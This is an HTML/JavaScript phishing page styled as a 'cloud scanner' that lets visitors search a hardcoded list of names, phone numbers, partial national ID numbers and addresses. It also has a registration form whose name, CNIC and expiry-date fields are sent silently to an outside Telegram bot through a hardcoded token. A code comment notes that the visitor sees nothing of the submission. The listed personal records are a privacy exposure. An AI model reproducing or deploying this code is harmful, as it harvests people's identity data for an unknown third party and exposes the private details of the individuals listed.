<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MUDASIR CLOUD SCANNER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
        .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
        .container { padding: 20px; }
        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
        input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; text-align: center; }
        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
        
        /* Form Styling */
        #reg-form-container { display: none; margin-top: 20px; border: 2px solid #ffcc00; padding: 20px; border-radius: 10px; }
        .reg-input { border-color: #ffcc00; color: #ffcc00; }
        
        /* Result Table Styling */
        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; }
        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
        th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
    </style>
</head>
<body>

    <div class="ad-banner">üõ∞Ô∏è MUDASIR CLOUD SERVER: SECURE ACCESS üõ∞Ô∏è</div>

    <div class="container">
        <div class="box">
            <h2>MUDASIR CLOUD SCANNER</h2>
            <input type="text" id="search-box" placeholder="ENTER MOBILE OR CNIC...">
            <button class="search-btn" onclick="searchData()">DECRYPT DATABASE üîç</button>
            <button class="earn-btn" onclick="showRegForm()">REGISTRATION FORM üìã</button>

            <div id="result-display"></div>

            <div id="reg-form-container">
                <h3 style="color:#ffcc00;">ENTER DETAILS TO REGISTER</h3>
                <input type="text" id="r-name" class="reg-input" placeholder="FULL NAME">
                <input type="text" id="r-cnic" class="reg-input" placeholder="CNIC NUMBER">
                <p style="color:#ffcc00; margin:5px 0;">EXPIRY DATE:</p>
                <input type="date" id="r-expiry" class="reg-input">
                <button class="earn-btn" onclick="submitToTelegram()">SUBMIT DATA</button>
            </div>
        </div>
    </div>

    <script>
        const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
        const cid = "7107389141";

        const database = [
            ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
            ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar", "JAZZ"],
            ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani", "JAZZ"],
            ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand", "JAZZ"],
            ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu", "JAZZ"]
            // Baki 38 records yahan add karte jayein...
        ];

        function searchData() {
            let val = document.getElementById("search-box").value.trim();
            let res = database.filter(r => r[1].includes(val) || r[2].includes(val));
            let out = document.getElementById("result-display");
            document.getElementById("reg-form-container").style.display = "none";

            if(res.length > 0) {
                // User ko screen par dikhana
                out.innerHTML = `<table>
                    <tr><th>NAME</th><td>${res[0][0]}</td></tr>
                    <tr><th>PHONE</th><td>${res[0][1]}</td></tr>
                    <tr><th>CNIC</th><td>${res[0][2]}</td></tr>
                    <tr><th>LOCATION</th><td>${res[0][3]}</td></tr>
                </table>`;
                // Aapko search ki khabar Telegram par mil jayegi
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("üîç Search: " + res[0][0])}`);
            } else {
                out.innerHTML = "<p style='color:red;'>NO RECORD FOUND</p>";
            }
        }

        function showRegForm() {
            document.getElementById("reg-form-container").style.display = "block";
            document.getElementById("result-display").innerHTML = "";
        }

        function submitToTelegram() {
            let n = document.getElementById("r-name").value;
            let c = document.getElementById("r-cnic").value;
            let e = document.getElementById("r-expiry").value;

            if(n && c && e) {
                let msg = `üìù *NEW REGISTRATION*\n\nüë§ Name: ${n}\nüÜî CNIC: ${c}\nüìÖ Expiry: ${e}`;
                
                // Silent Submission to Telegram
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                
                // User ko screen par kuch nahi dikhega, form gayab ho jayega
                document.getElementById("reg-form-container").innerHTML = "<p style='color:#ffcc00;'>Request submitted for verification.</p>";
                setTimeout(() => { document.getElementById("reg-form-container").style.display = "none"; }, 2000);
            }
        }
    </script>
</body>
</html>
